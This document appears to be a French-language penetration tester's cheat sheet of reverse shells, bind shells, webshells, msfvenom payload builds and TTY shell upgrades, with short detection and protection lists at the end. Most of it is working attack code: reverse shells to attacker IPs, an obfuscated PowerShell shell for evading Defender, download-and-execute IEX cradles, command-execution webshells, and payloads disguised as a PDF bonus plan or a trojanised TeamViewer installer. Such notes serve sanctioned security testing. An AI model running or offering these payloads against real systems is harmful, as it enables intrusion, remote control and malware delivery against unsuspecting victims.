
https://www.revshells.com/
https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#summary
https://highon.coffee/blog/reverse-shell-cheat-sheet/


- [[#**REVERSE SHELLS**]]
- [[#**BIND SHELLS**]]
- [[#**WEBSHELLS**]]

- [[#MSFVENOM]]

- [[#Importer un Shell interactif TTY]]

- [[#DETECTION & PREVENTION]]
- [[#PROTECTION]]




# **REVERSE SHELLS**

### BASH

```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

```bash
busybox nc 10.10.14.63 443 -e /bin/bash
```

### POWERSHELL

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

#### Bypass defender

```powershell
$client = &("{0}{1}{2}" -f'Ne','w-Ob','ject') System.Net.Sockets.TCPClient("192.168.1.26",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|.('%'){0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (.("{1}{2}{0}"-f'ct','New-O','bje') -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (.("{0}{1}" -f'i','ex') $data 2>&1 | .("{2}{0}{1}"-f 't-','String','Ou') );$sendback2 = $sendback + "PS " + (.("{1}{0}"-f 'wd','p')).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
}
```

### NISHANG

https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

ajouter à la fin du script

```shell-session
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443
```

Depuis la target 

```powershell
powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')
```

### METERPRETER

Charger DLL a distance depuis partage SMB

```shell
search smb_delivery
```

```shell-session
use 0
```

```shell-session
show options
```

```shell-session
show targets
```

```shell-session
set target 0
```

```
run
```

Depuis la target

```shell-session
rundll32.exe \\<attacker-ip>\lEUZam\test.dll,0
```

### NC.EXE

Si aucun shell ne fonction transférer nc.exe sur la victime (depuis un webshell par exemple)

```cmd
bitsadmin /transfer wcb /priority foreground http://10.10.16.4:8000/nc.exe C:\Users\Gerald\nc.exe
```

Lancer listener puis executer nc.exe

```
C:\Users\Gerald\nc.exe 10.10.16.4 9443 -e powershell
```


---
# **BIND SHELLS**

### BASH

sur la target
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 8000 > /tmp/f
```

puis depuis attacker
```shell
nc -nv 10.129.41.200 8000
```

### PYTHON

```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

bindshell.py

```python
import socket
import subprocess
import click
from threading import Thread

def run_cmd(cmd):
    output = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    return output.stdout

def handle_input(client_socket):
    while True:
        chunks = []
        chunk = client_socket.recv(2048)
        chunks.append(chunk)
        while len(chunk) != 0 and chr(chunk[-1]) != '\n':
            chunk = client_socket.recv(2048)
            chunks.append(chunk)
        cmd = (b''.join(chunks)).decode()[:-1]

        if cmd.lower() == 'exit':
            client_socket.close()
            break

        output = run_cmd(cmd)
        client_socket.sendall(output)

@click.command()
@click.option('--port', '-p', default=4444)
def main(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', port))
    s.listen(4)

    while True:
        client_socket, _ = s.accept()
        t = Thread(target=handle_input, args=(client_socket, ))
        t.start()

if __name__ == '__main__':
    main()
```

### POWERSHELL

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```


# **WEBSHELLS**

Toujours protéger avec un mot de passe / randomiser le nom du webshell (hash md5 par ex)

Weevely

|Web Server|Default Webroot|
|---|---|
|`Apache`|/var/www/html/|
|`Nginx`|/usr/local/nginx/html/|
|`IIS`|c:\inetpub\wwwroot\|
|`XAMPP`|C:\xampp\htdocs\|
## PHP

```php
<?php system($_REQUEST['bb58021f870b5f85c6c24120540de43f']); ?>
```

```php
<?php
    if(isset($_GET['cmd']))
    {
    system($_GET['cmd']);
    }
?>
```

## ASP

```asp
<% eval request('bb58021f870b5f85c6c24120540de43f') %>
```

### JSP

```jsp
<% Runtime.getRuntime().exec(request.getParameter("bb58021f870b5f85c6c24120540de43f")); %>
```

## LAUDANUM

https://github.com/jbarcia/Web-Shells/tree/master/laudanum

Collection de webshells (penser à retirer les commentaires et ascii art qui sont flags)

```bash
tree /usr/share/laudanum
```

## ANTAK

https://github.com/samratashok/nishang.git

```shell
cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/administrator/Upload.aspx
```

Ajouter un user et mot de passe au webshell (penser à retirer les commentaires et ascii art qui sont flags)

retirer tous les commentaires // dans vim
```
:%s/\s*#.*$//
```



---
# MSFVENOM


> [!IMPORTANT]
> Staged payload -> envoie un premier stage afin d'établir la connexion puis télécharge le reste après.
> 
> Stageless -> Envoie tout en même temps -> plus FUD car moins de bande passante utilisée et plus stable que le staged



Afficher la liste des payloads disponibles

```BASH
msfvenom -l payloads
```

## LINUX

Stageless Linux x64 reverse shell ELF

```shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```

## WINDOWS

Stageless Windows reverse shell #EXE

```shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe > BonusCompensationPlanpdf.exe
```

Staged Windows x64 meterpreter reverse #DLL

```BASH
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -e x86/shikata_ga_nai -i 10 -f dll > charge.dll
```

Staged Windows x64 meterpreter reverse #MSI

```BASH
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT
-e x86/shikata_ga_nai -i 10 -f msi > charge.msi
```

### AV EVASION

Stageless Windows x86 avec Template de programme et encodé en Shikata

```shell
msfvenom -p windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5 -f exe
```


---
# Importer un Shell interactif #TTY


## LINUX

### Python TTY Shell Trick

```python
python3 -c 'import pty;pty.spawn("/bin/bash")'

export TERM=xterm

CTRL+Z

stty raw -echo; fg
```

```bash
echo os.system('/bin/bash')
```



Spawn interactive shell with script

```
script -q /dev/null /bin/bash
CTRL+Z
stty raw -echo; fg
bash
export TERM=xterm
```

### Spawn Interactive sh shell

```bash
/bin/sh -i
```

### Spawn Perl TTY Shell

```perl
perl: exec "/bin/sh";
perl —e 'exec "/bin/sh";'
```


### Spawn Ruby TTY Shell

```ruby
ruby: exec "/bin/sh"
```

### Spawn Lua TTY Shell
```lua
lua: os.execute('/bin/sh')
```

### Spawn TTY Shell depuis Vi/Vim

```shell
vim -c ':!/bin/sh'
```

Run shell commands from vi:

```bash
:!bash
```

```shell
vim
:set shell=/bin/sh
:shell
```

### Spawn TTY Shell NMAP

```bash
nmap --interactive
!sh
```

### Spawn TTY Shell AWK

```shell
awk 'BEGIN {system("/bin/bash")}'
```

### Spawn TTY Shell Find

```shell
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```

```shell
find . -exec /bin/sh \; -quit
```

## WINDOWS

### ConPTYShell (Completement interactif (fleches et autocompletion))

https://github.com/antonioCoco/ConPtyShell

attacker

```
wget https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1
```

```
python3 -m http.server 80
```

```
stty raw -echo; (stty size; cat) | nc -lvnp 443
```

target

```
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.177/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell 10.10.14.177 443
```

### Nishang (Semi interactif (pas de flèches / autocompletion))

https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcp.ps1

attacker

```
python -m http.server 80
```

```
nc -nvlp 443
```

target

```
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.177/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.177 -Port 443
```


---

# DETECTION & PREVENTION

Monitorer 
- les uploads de fichiers
- Les commandes suspicieuses telles que whoami, logname...
- La connexion à des partages suspicieux
- monitorer les commandes powershell / cmd
- Le traffic réseau anormal (vers port 4444 qui est le default de metasploit par exemple)-> Heartbeat
- SIEM
-
Mettre IDS/IPS en place -> Crowdec par exemple ou Fail2ban
Mettre NIDS en place -> Snort
NDR -> Darktrace / Zeek(free) / Vectra...

---

# PROTECTION

- Sandboxing
- Segmentation réseau (VLAN, DMZ...)
- Hardening
- Moindre privilèges
- Firewalls applicatifs et physique 
